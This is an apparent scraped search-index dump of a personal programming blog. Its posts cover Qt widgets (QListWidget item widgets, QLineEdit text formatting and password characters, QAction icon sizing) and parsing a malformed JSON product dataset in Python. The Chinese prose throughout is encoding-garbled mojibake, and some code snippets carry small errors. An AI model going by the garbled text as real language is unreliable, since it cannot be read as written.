æ·»åŠ æ§ä»¶ æ•ˆæœ æ–°å»ºé¡¹ç›®çš„æ—¶å€™åˆ›å»ºä¸€ä¸ªå¸¦uiçš„é¡¹ç›®ï¼Œæ–°å»ºå®Œæˆåï¼Œåœ¨ç•Œé¢æ‹–æ‹½ä¸€ä¸ªQListWidgetã€‚ Widget.h 1234567891011121314151617181920212223242526272829303132333435#ifndef WIDGET_H#define WIDGET_H#include &lt;QWidget&gt;#include &lt;QListWidget&gt;#include &lt;QStringList&gt;#include &lt;QString&gt;#include &lt;QDebug&gt;#include &lt;QListWidgetItem&gt;#include &lt;QGridLayout&gt;#include &lt;QToolButton&gt;#include &lt;QLineEdit&gt;#include &lt;QRadioButton&gt;QT_BEGIN_NAMESPACEnamespace Ui &#123; class Widget; &#125;QT_END_NAMESPACEclass Widget : public QWidget&#123; Q_OBJECTpublic: Widget(QWidget *parent = nullptr); ~Widget();private: void initListWidget();private: Ui::Widget *ui;&#125;;#endif // WIDGET_H Widget.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;Widget::Widget(QWidget *parent) : QWidget(parent) , ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); initListWidget();&#125;Widget::~Widget()&#123; delete ui;&#125;void Widget::initListWidget()&#123; ui-&gt;listWidget-&gt;setCurrentRow(2); QStringList StrListHeader; StrListHeader &lt;&lt; QString(&quot;é€‰ä¸­&quot;) &lt;&lt; QString(&quot;åºå·&quot;) &lt;&lt; QString(&quot;æ–‡ä»¶å&quot;); new QListWidgetItem(tr(&quot;Oak&quot;), ui-&gt;listWidget); new QListWidgetItem(tr(&quot;Fir&quot;), ui-&gt;listWidget); new QListWidgetItem(tr(&quot;Pine&quot;), ui-&gt;listWidget); QListWidgetItem *ListItem = new QListWidgetItem; // ListItem-&gt;setText(); QListWidgetItem *WContainerItem = new QListWidgetItem(ui-&gt;listWidget); QWidget *WContainer = new QWidget(ui-&gt;listWidget);//æ–°å»ºä¸€ä¸ªQWidgetçª—å£ QGridLayout*Glayout = new QGridLayout;/*************start*****************//* åœ¨è¿™é‡Œæ·»åŠ éœ€è¦çš„æ§ä»¶ */ QLineEdit *lineEdit = new QLineEdit; QLineEdit *lineEdit_1 = new QLineEdit; QToolButton *toolButton = new QToolButton; QRadioButton *radioButton = new QRadioButton; QRadioButton *radioButton_1 = new QRadioButton; Glayout-&gt;addWidget(lineEdit,0,0); Glayout-&gt;addWidget(radioButton,0,1); Glayout-&gt;addWidget(lineEdit_1,0,2); Glayout-&gt;addWidget(radioButton_1,0,3); WContainer-&gt;setLayout(Glayout);/******************end****************/ WContainerItem-&gt;setSizeHint(QSize(40,40)); ui-&gt;listWidget-&gt;setItemWidget(WContainerItem, WContainer);//å°†WContainerèµ‹äºˆWContainerItem&#125;","tags":[{"name":"Qt/QListWidget","slug":"Qt-QListWidget","permalink":"https://hodlyounger.github.io/tags/Qt-QListWidget/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘QLineEdit ä¿®æ”¹éƒ¨åˆ†æ–‡æœ¬æ ·å¼","date":"2023-10-27T01:24:02.227Z","path":"B_Code/Qt/QLineEdit/ã€Qtã€‘QLineEditä¿®æ”¹éƒ¨åˆ†æ–‡æœ¬æ ·å¼/","text":"åŠŸèƒ½æè¿°ï¼š ä¿®æ”¹QLineEditä¸­éƒ¨åˆ†æ–‡æœ¬çš„æ ·å¼ é¢„æœŸæ•ˆæœï¼š windowsç³»ç»Ÿè·¯å¾„ä¸å…è®¸æœ‰ï¼Ÿç­‰ç¬¦å·ï¼Œé«˜äº®æ˜¾ç¤ºä¸å…è®¸çš„ç¬¦å·ã€‚ [toc] å®ç° 12345678910111213141516171819202122static void setLineEditTextFormat(QLineEdit* lineEdit, const QList&lt;QTextLayout::FormatRange&gt;&amp; formats)&#123; if(!lineEdit) return; QList&lt;QInputMethodEvent::Attribute&gt; attributes; foreach(const QTextLayout::FormatRange&amp; fr, formats) &#123; QInputMethodEvent::AttributeType type = QInputMethodEvent::TextFormat; int start = fr.start - lineEdit-&gt;cursorPosition(); int length = fr.length; QVariant value = fr.format; attributes.append(QInputMethodEvent::Attribute(type, start, length, value)); &#125; QInputMethodEvent event(QString(), attributes); QCoreApplication::sendEvent(lineEdit, &amp;event);&#125;static void clearLineEditTextFormat(QLineEdit* lineEdit)&#123; setLineEditTextFormat(lineEdit, QList&lt;QTextLayout::FormatRange&gt;());&#125; ç¤ºä¾‹ 1234567891011121314151617181920212223242526// Usage example:QLineEdit* lineEdit = new QLineEdit;lineEdit-&gt;setText(tr(&quot;Task Tracker - Entry&quot;));QList&lt;QTextLayout::FormatRange&gt; formats;QTextCharFormat f;f.setFontWeight(QFont::Bold);QTextLayout::FormatRange fr_task;fr_task.start = 0;fr_task.length = 4;fr_task.format = f;f.setFontItalic(true);f.setBackground(Qt::darkYellow);f.setForeground(Qt::white);QTextLayout::FormatRange fr_tracker;fr_tracker.start = 5;fr_tracker.length = 7;fr_tracker.format = f;formats.append(fr_task);formats.append(fr_tracker);setLineEditTextFormat(lineEdit, formats);","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"QLineEdit","slug":"B-Code/Qt/QLineEdit","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QLineEdit/"}]},{"title":"ã€Qtã€‘QLineEdit ä¿®æ”¹å¯†ç æ¨¡å¼åŠå…¶æ ·å¼","date":"2023-10-27T01:24:02.226Z","path":"B_Code/Qt/QLineEdit/ã€Qtã€‘QLineEdit ä¿®æ”¹å¯†ç æ˜¾ç¤ºåŠå…¶æ˜¾ç¤ºæ ·å¼/","text":"[toc] Qtè®¾ç½®ä¸ºå¯†ç æ¨¡å¼ å‚è€ƒ QLineEdit::setEchoModeã€‚å¯†ç æ¨¡å¼æ€»å…±æœ‰ä¸¤ç§ QLineEdit::Password QLineEdit::PasswordEchoOnEdit ä¿®æ”¹æ ·å¼ QLineEdit å¯†ç æ ·å¼ä½¿ç”¨ Unicode å­—ç¬¦è¡¨ç¤º, å¯†ç æ ·å¼ä¿®æ”¹åœ¨QLineEdit::Password ã€QLineEdit::PasswordEchoOnEdit æœ‰æ•ˆ Unicode å€¼æŸ¥è¯¢ç½‘å€ï¼š https://unicode-table.com/cn/search/ 1. é»˜è®¤æ ·å¼ é»˜è®¤æ ·å¼æ˜¯å®å¿ƒåœ†ç‚¹ ï¼ŒUnicodeå€¼ 9769 2. è‡ªå®šä¹‰æ ·å¼ å‚è€ƒ Qt åŠ©æ‰‹ ä¸­çš„æå‡ï¼Œæœç´¢ Qt Style Sheets Examples ä¸­å…³äº QLineEdit çš„æç¤ºè®¾ç½®å³å¯ã€‚ * çš„ unicode ç¼–ç ä¸º 9679ã€‚ 1234QLineEdit[echoMode=&quot;2&quot;] &#123; lineedit-password-character: 9679; &#125;","tags":[{"name":"Qt/QLineEdit","slug":"Qt-QLineEdit","permalink":"https://hodlyounger.github.io/tags/Qt-QLineEdit/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"QLineEdit","slug":"B-Code/Qt/QLineEdit","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QLineEdit/"}]},{"title":"ã€Qtã€‘QAction Icon å¤§å°é—®é¢˜","date":"2023-10-27T01:24:02.224Z","path":"B_Code/Qt/ã€Qtã€‘QAction Icon å¤§å°/","text":"[toc] é—®é¢˜æè¿° å³é”®æ‰˜ç›˜å¼¹å‡ºèœå•ï¼Œè¿™ä¸ªèœå•æ˜¯æ˜¯é€šè¿‡ QMenu å®ç°çš„ï¼Œé€šè¿‡æ·»åŠ  QAction å®ç°äº†å‡ ä¸ªå­é¡¹ã€‚åç»­ UI ä¼˜åŒ–ï¼Œæå‡ºéœ€è¦ä¿®æ”¹ Iconçš„å¤§å°ï¼Œè®¾ç½® Icon çš„å¤§å°ä¸º 24*24ï¼Œé‚è¿›è¡Œäº†ä¸€ç•ªå°è¯•ï¼Œå› å½±å“é¢‡å¤šï¼Œæš‚ä¸”è®°å½•äºæ­¤ã€‚ å…³äºæˆ‘è¿™ä¸ªå³é”®æ‰˜ç›˜å¼¹å‡ºé€‰é¡¹æ¡†çš„è‚¯å®šæœ‰åˆ«çš„æ–¹æ¡ˆï¼Œä½†æ˜¯ç¬¬ä¸€æ—¶é—´æ˜¯æƒ³æ‰¾ä¸€ç§æ¯”è¾ƒç®€å•çš„æ–¹æ¡ˆå»å®ç°ï¼Œå› æ­¤ä¸€ç›´åœ¨æœç´¢å¦‚ä½•è®¾ç½®Iconå¤§å°çš„é—®é¢˜ï¼Œç›®å‰çœ‹åˆ°çš„è§£å†³æ–¹æ¡ˆæœ‰ä»¥ä¸‹å‡ ç§ï¼š é€šè¿‡è®¾ç½® Style å®ç° é€šè¿‡ QWidgetAction å®ç° æ–°å»ºä¸€ä¸ª Widgetï¼Œå®ç° QMenu çš„æ•ˆæœ 1 é€šè¿‡è®¾ç½® Styleï¼Œä¿®æ”¹icon size æ–°å»ºæ ·å¼ç±» 123456789101112131415161718192021222324252627282930313233343536373839404142434445#pragma once#include &lt;QCommonStyle&gt;#include &lt;QStyleOption&gt;// è‡ªå®šä¹‰ä¸€ä¸ªstyleç±»ï¼Œé€šè¿‡setStyleè®¾ç½®ç»™menuï¼Œä»¥æ­¤è®¾ç½®iconsizeclass QCustonIconStyle : public QCommonStyle&#123; Q_OBJECTpublic: QCustonIconStyle(int size) : QCommonStyle(), size_(size) &#123;&#125;protected: int QCustonIconStyle::pixelMetric(PixelMetric metric, const QStyleOption* option, const QWidget* widget) const override &#123; if (metric == QStyle::PM_SmallIconSize) &#123; return size_; &#125;#if 1 // ä¸€ä¸‹å†…å®¹æ˜¯æˆ‘å°è¯•ä¿®æ”¹UIçš„ï¼Œæ”¹äº†sizeä¹‹åä¼šå¯¼è‡´iconç§»ä½ï¼Œéœ€è¦ä¿®æ”¹é—´è·å’Œè¾¹è· else if (metric == QStyle::PM_LayoutLeftMargin) &#123; return 1; &#125; else if (metric == QStyle::PM_MenuHMargin) &#123; return 1; &#125; else if (metric == QStyle::PM_LayoutHorizontalSpacing) &#123; return 1; &#125;#endif return QCommonStyle::pixelMetric(metric, option, widget); &#125;private: int size_;&#125;; ä½¿ç”¨æ–¹æ³•ï¼š 12QCustonIconStyle* style = new QCustonIconStyle(20);QMenu-&gt;setStyle(style); é—ç•™é—®é¢˜ï¼Œä½¿ç”¨è¯¥æ–¹æ³•ä¹‹åï¼ŒQActionçš„ horverd() ä¿¡å·å°±ä¸ä¼šè§¦å‘äº† å…³äºè¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°è¯•äº†ä¸€å¤©ï¼Œæœ€ç»ˆé€‰æ‹©ç»§æ‰¿é‡å†™ QProxyStyle å°±èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ 2 ä½¿ç”¨ QWidgetAction 1234action_ = new QPushButton(menu);QWidgetAction* action = new QWidgetAction(this);action-&gt;setDefaultWidget(action_ );menu-&gt;addAction(action); 3 æ–°å»ºç•Œé¢","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Pythonã€‘è§£æJson","date":"2023-10-27T01:24:02.222Z","path":"B_Code/Python/ã€Pythonã€‘è§£æJson/","text":"è§£æJsonçš„å¸¸è§ä»£ç  1import json # å¯¼å…¥jsonè§£æéœ€è¦çš„åŒ… 1. json.loads()è¯»å–å­—ç¬¦ä¸²åˆ°json object json.loads()æ˜¯å°†str\\bytes\\bytearrayç­‰æ ¼å¼çš„æ–‡ä»¶è¯»å–åˆ°json objectä¸­ã€‚ä½†æ˜¯åœ¨ä½¿ç”¨çš„æ—¶å€™å¾€å¾€ä¼šå› ä¸ºä¸€äº›å°é—®é¢˜å¯¼è‡´è¯»å–é”™è¯¯ç­‰ã€‚ 1234567891011121314151617181920212223242526272829303132Docstring:Deserialize ``s`` (a ``str``, ``bytes`` or ``bytearray`` instancecontaining a JSON document) to a Python object.``object_hook`` is an optional function that will be called with theresult of any object literal decode (a ``dict``). The return value of``object_hook`` will be used instead of the ``dict``. This featurecan be used to implement custom decoders (e.g. JSON-RPC class hinting).``object_pairs_hook`` is an optional function that will be called with theresult of any object literal decoded with an ordered list of pairs. Thereturn value of ``object_pairs_hook`` will be used instead of the ``dict``.This feature can be used to implement custom decoders. If ``object_hook``is also defined, the ``object_pairs_hook`` takes priority.``parse_float``, if specified, will be called with the stringof every JSON float to be decoded. By default this is equivalent tofloat(num_str). This can be used to use another datatype or parserfor JSON floats (e.g. decimal.Decimal).``parse_int``, if specified, will be called with the stringof every JSON int to be decoded. By default this is equivalent toint(num_str). This can be used to use another datatype or parserfor JSON integers (e.g. float).``parse_constant``, if specified, will be called with one of thefollowing strings: -Infinity, Infinity, NaN.This can be used to raise an exception if invalid JSON numbersare encountered.To use a custom ``JSONDecoder`` subclass, specify it with the ``cls``kwarg; otherwise ``JSONDecoder`` is used. data.jsonæ–‡ä»¶é“¾æ¥ é“¾æ¥ï¼šhttps://pan.baidu.com/s/1omzU65YMpJr0jPPFItZ7SA æå–ç ï¼šysly å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦ ä¸Šè¿°æ–‡ä»¶ç›¸å¯¹å¸¸è§çš„Jsonæ–‡ä»¶æ¥è¯´ï¼Œè¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«çš„ï¼Œç”¨pythonçš„jsonåº“æ“ä½œç›¸å¯¹æœ‰ç‚¹å›°éš¾ã€‚ æŠ¥é”™Expection \\ï¼Œdelimiterï¼Œçœ‹äº†å¥½äº›è§£å†³åŠæ³•ä»ç„¶æ²¡èƒ½æˆåŠŸè§£å†³ï¼š 1234# è¾“å…¥æ–‡ä»¶&#123;&#x27;asin&#x27;: &#x27;0000032069&#x27;, &#x27;title&#x27;: &#x27;Adult Ballet Tutu Cheetah Pink&#x27;, &#x27;price&#x27;: 7.89, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/51EzU6quNML._SX342_.jpg&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;0000032034&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00EXVN9PU&#x27;, &#x27;B0041EOTJO&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B001GTKPDQ&#x27;, &#x27;B00EON0SJ2&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002XZMGGQ&#x27;], &#x27;also_viewed&#x27;: [&#x27;B00D0F450I&#x27;, &#x27;0000032050&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;0000032042&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B0071KR2LC&#x27;, &#x27;B00GOR07RE&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B0079MCIMU&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00H3RYN3I&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B007IEFT84&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B007R2RM8W&#x27;, &#x27;B007VM3AMK&#x27;, &#x27;B00C0PLENA&#x27;, &#x27;B00BJGG6VG&#x27;, &#x27;B00E1YRI4C&#x27;, &#x27;B00IIK61WA&#x27;, &#x27;B009UC638W&#x27;, &#x27;B00KZN6RVI&#x27;, &#x27;B00CSFEENY&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00HSOJJ94&#x27;, &#x27;B00LIPP4VG&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B00E87F196&#x27;, &#x27;B005HMHOQY&#x27;, &#x27;B00J6S9MSS&#x27;, &#x27;0000032034&#x27;, &#x27;B00CJQGNJK&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B0056LG7GY&#x27;, &#x27;B00DPQWCZ2&#x27;, &#x27;B00I3PV0US&#x27;, &#x27;B00KZN6IVW&#x27;, &#x27;B0054TBWKO&#x27;, &#x27;B00I2S01I8&#x27;, &#x27;B00BXF12P8&#x27;, &#x27;B00GVHU678&#x27;, &#x27;B005NWENGC&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B00JK8MQ4Q&#x27;, &#x27;B00FZIMVQS&#x27;, &#x27;B008BB19VE&#x27;, &#x27;B00GTEXPOE&#x27;, &#x27;B009WPT2RQ&#x27;, &#x27;B00E37SBBG&#x27;], &#x27;bought_together&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;]&#125;, &#x27;brand&#x27;: &#x27;BubuBibi&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]]&#125;&#123;&#x27;asin&#x27;: &#x27;0000031909&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;0000031895&#x27;, &#x27;B00D2K1M3O&#x27;, &#x27;0000031852&#x27;, &#x27;B00D0WDS9A&#x27;, &#x27;B00D10CLVW&#x27;, &#x27;B00D103F8U&#x27;, &#x27;B003AVEU6G&#x27;, &#x27;B00D2K0PA0&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00D0ZF44Y&#x27;, &#x27;B008F0SMUC&#x27;, &#x27;B00D0GCI8S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B002YSCPZY&#x27;, &#x27;0448408775&#x27;, &#x27;B002R0FABA&#x27;, &#x27;B008GHWNWC&#x27;, &#x27;B002R0FA24&#x27;, &#x27;B001GTKPEK&#x27;, &#x27;B006XA7KZO&#x27;, &#x27;B001GZUQ9S&#x27;, &#x27;B00613VNL0&#x27;, &#x27;B003IEDM9Q&#x27;, &#x27;B003LTOZK8&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B008UBQZKU&#x27;, &#x27;B001AQD8VQ&#x27;, &#x27;B003ILA0L2&#x27;, &#x27;B00AFDOPDA&#x27;, &#x27;B002R0F7FE&#x27;], &#x27;also_viewed&#x27;: [&#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B00E1YRI4C&#x27;, &#x27;B00AFDOPDA&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00CEUWY8K&#x27;, &#x27;B003IEDM9Q&#x27;, &#x27;B00HSOJB9M&#x27;, &#x27;0000031895&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B008F0SMUC&#x27;, &#x27;B00362QGW0&#x27;, &#x27;B008UD01L2&#x27;, &#x27;B00FAZ5ZE6&#x27;, &#x27;B008F0SY6O&#x27;, &#x27;B00DPLLQR2&#x27;, &#x27;B00CEUWUZC&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B00CEUX0D8&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D10CLVW&#x27;, &#x27;B00D23MC6W&#x27;, &#x27;B007XAI53E&#x27;, &#x27;B008X6CBS2&#x27;, &#x27;B004PEI45U&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002C3Y6WG&#x27;, &#x27;B00HSC8O74&#x27;, &#x27;B008BMGHM4&#x27;, &#x27;B00CEUWTFS&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B00CYBU84G&#x27;, &#x27;B00D9C32NI&#x27;, &#x27;B0046W9T8C&#x27;, &#x27;B008UBG5IW&#x27;, &#x27;B001YHX45G&#x27;, &#x27;B00CEV8366&#x27;, &#x27;B00I2UHSZA&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B001GTKPEK&#x27;, &#x27;B004TU1VPU&#x27;, &#x27;B00CBPIO7S&#x27;, &#x27;B00CHHXJ0M&#x27;, &#x27;B00538F5OK&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B00CEUX4QQ&#x27;, &#x27;B003XRKA7A&#x27;, &#x27;0000031852&#x27;, &#x27;B002C3R5XI&#x27;, &#x27;B00C6Q1Z6E&#x27;], &#x27;bought_together&#x27;: [&#x27;B002BZX8Z6&#x27;]&#125;, &#x27;title&#x27;: &#x27;Girls Ballet Tutu Neon Pink&#x27;, &#x27;price&#x27;: 7.0, &#x27;salesRank&#x27;: &#123;&#x27;Toys &amp; Games&#x27;: 201847&#125;, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/41xBoP0FVzL._SY300_.jpg&#x27;, &#x27;brand&#x27;: &#x27;Unknown&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;]], &#x27;description&#x27;: &#x27;High quality 3 layer ballet tutu. 12 inches in length&#x27;&#125; 1234567891011121314151617181920212223242526# å¸¸è§çš„Jsonè¯»å–JsonText = open(&#x27;data.json&#x27;,encoding=&#x27;utf-8&#x27;) # æ‰“å¼€data.jsonJson = JsonText.readlines() # æŠŠjsonä¸­çš„æ–‡ä»¶å…¨éƒ¨è¯»å–åˆ°Jsonå¯¹è±¡ä¸­ã€‚# è¯»å–ä¸Šè¿°data.jsonä¸ºjsonå¯¹è±¡çš„ä»£ç list_data = list()def read_Json_file(i,x): # è¿”å›æœ‰æ•ˆçš„Jsonå­—æ®µ print(&quot;ç¬¬&quot; + i + &quot;è¡Œ:&quot;) print(x) # å…³äºexpectintçš„æŠ¥é”™ï¼Œæˆ‘è¿™å¤„ç†å°±æ˜¯ä½†å‡¡æŠ¥é”™ï¼Œç›´æ¥è¿”å›ç©ºå­—æ®µï¼Œå¦‚æœä½ æœ‰åˆ«çš„è§£å†³åŠæ³•ï¼Œä¸€å®šæŒ‡æ•™ä¸€ä¸‹ï¼Œä¸èƒœæ„Ÿæ¿€ try: JsonStr = x.replace(&quot;&#x27;&quot;, &#x27;&quot;&#x27;).replace(&#x27;/ &#x27;, &#x27;/&#x27;).replace(&#x27;, &#x27;,&#x27;,&#x27;) ret = json.loads(JsonStr,strict=False) except json.JSONDecodeError: return &#x27; &#x27; if(&#x27;categories&#x27; in ret): print(ret[&#x27;categories&#x27;]) return ret[&#x27;categories&#x27;] else: return &#x27; &#x27; list_data = list()for i in range(0,len(Json)): list_data.append(read_Json_file(str(i+1),Json[i])) ç¨‹åºè¾“å‡º 12345678ç¬¬1è¡Œ:&#123;&#x27;asin&#x27;: &#x27;0000032069&#x27;, &#x27;title&#x27;: &#x27;Adult Ballet Tutu Cheetah Pink&#x27;, &#x27;price&#x27;: 7.89, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/51EzU6quNML._SX342_.jpg&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;0000032034&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00EXVN9PU&#x27;, &#x27;B0041EOTJO&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B001GTKPDQ&#x27;, &#x27;B00EON0SJ2&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002XZMGGQ&#x27;], &#x27;also_viewed&#x27;: [&#x27;B00D0F450I&#x27;, &#x27;0000032050&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;0000032042&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B0071KR2LC&#x27;, &#x27;B00GOR07RE&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B0079MCIMU&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00H3RYN3I&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B007IEFT84&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B007R2RM8W&#x27;, &#x27;B007VM3AMK&#x27;, &#x27;B00C0PLENA&#x27;, &#x27;B00BJGG6VG&#x27;, &#x27;B00E1YRI4C&#x27;, &#x27;B00IIK61WA&#x27;, &#x27;B009UC638W&#x27;, &#x27;B00KZN6RVI&#x27;, &#x27;B00CSFEENY&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00HSOJJ94&#x27;, &#x27;B00LIPP4VG&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B00E87F196&#x27;, &#x27;B005HMHOQY&#x27;, &#x27;B00J6S9MSS&#x27;, &#x27;0000032034&#x27;, &#x27;B00CJQGNJK&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B0056LG7GY&#x27;, &#x27;B00DPQWCZ2&#x27;, &#x27;B00I3PV0US&#x27;, &#x27;B00KZN6IVW&#x27;, &#x27;B0054TBWKO&#x27;, &#x27;B00I2S01I8&#x27;, &#x27;B00BXF12P8&#x27;, &#x27;B00GVHU678&#x27;, &#x27;B005NWENGC&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B00JK8MQ4Q&#x27;, &#x27;B00FZIMVQS&#x27;, &#x27;B008BB19VE&#x27;, &#x27;B00GTEXPOE&#x27;, &#x27;B009WPT2RQ&#x27;, &#x27;B00E37SBBG&#x27;], &#x27;bought_together&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;]&#125;, &#x27;brand&#x27;: &#x27;BubuBibi&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]]&#125;[[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]]ç¬¬2è¡Œ:&#123;&#x27;asin&#x27;: &#x27;0000031909&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;0000031895&#x27;, &#x27;B00D2K1M3O&#x27;, &#x27;0000031852&#x27;, &#x27;B00D0WDS9A&#x27;, &#x27;B00D10CLVW&#x27;, &#x27;B00D103F8U&#x27;, &#x27;B003AVEU6G&#x27;, &#x27;B00D2K0PA0&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00D0ZF44Y&#x27;, &#x27;B008F0SMUC&#x27;, &#x27;B00D0GCI8S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B002YSCPZY&#x27;, &#x27;0448408775&#x27;, &#x27;B002R0FABA&#x27;, &#x27;B008GHWNWC&#x27;, &#x27;B002R0FA24&#x27;, &#x27;B001GTKPEK&#x27;, &#x27;B006XA7KZO&#x27;, &#x27;B001GZUQ9S&#x27;, &#x27;B00613VNL0&#x27;, &#x27;B003IEDM9Q&#x27;, &#x27;B003LTOZK8&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B008UBQZKU&#x27;, &#x27;B001AQD8VQ&#x27;, &#x27;B003ILA0L2&#x27;, &#x27;B00AFDOPDA&#x27;, &#x27;B002R0F7FE&#x27;], &#x27;also_viewed&#x27;: [&#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, 